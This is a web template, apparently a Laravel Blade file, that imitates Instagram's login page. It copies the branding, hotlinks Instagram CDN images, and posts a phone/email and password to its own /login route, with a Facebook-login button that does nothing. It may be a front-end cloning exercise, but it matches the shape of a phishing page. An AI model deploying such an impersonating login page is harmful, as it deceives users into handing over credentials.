<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    @vite(['resources/css/index.css'])
    <title>Instagram</title>
</head>
<body>
    <div class="container">
        <div class="phone">
            <div class="slide"></div>
        </div>
        <div class="login-box">
            <img class="logo" src="{{Vite::asset('./resources/images/logo.png')}}" alt="">
            <form class="login" action="/login" method="post">
                @csrf
                @method('put')
                <input id="emailOrPhone" type="text" placeholder="Phone number or email" required name="emailorphone">
                <input id="password" type="password" placeholder="Password" required name="password">
                <div class="error">{{$errorMessage}}</div>
                <br>
                <input id="submit" type="submit" id="submit_btn" value="Log in">
            </form>
            <div class="alternative">
                <p><b>OR</b></p>
                <br>
                <button class="invalid-btn" onclick="invalidClick()">
                        <a href="">

                        <i class="fa-brands fa-square-facebook"></i> Log in With Facebook
                    </a>
                    </button>
                <p>Forgot Password?</p>
            </div>
            <div class="signup">
                <p>Don't have an account? <a href="/signup">Sign Up</a></p>
            </div>
            <div class="store">
                <div>
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on google play">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from microsoft">
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="links">
            <a href="http://">Meta</a>
            <a href="http://">About</a>
            <a href="http://">Blog</a>
            <a href="http://">Jobs</a>
            <a href="http://">Help</a>
            <a href="http://">API</a>
            <a href="http://">Privacy</a>
            <a href="http://">Terms</a>
            <a href="http://">Top Account</a>
            <a href="http://">Hashtags</a>
            <a href="http://">Locations</a>
            <a href="http://">Instagram Lite</a>
            <a href="http://">Contact uploading & non-users</a>
        </div>
        <p>© 2022 Instagram from Meta</p>
    </footer>
    <script src="{{Vite::asset('./resources/js/insta.js')}}"></script>
</body>
</html>
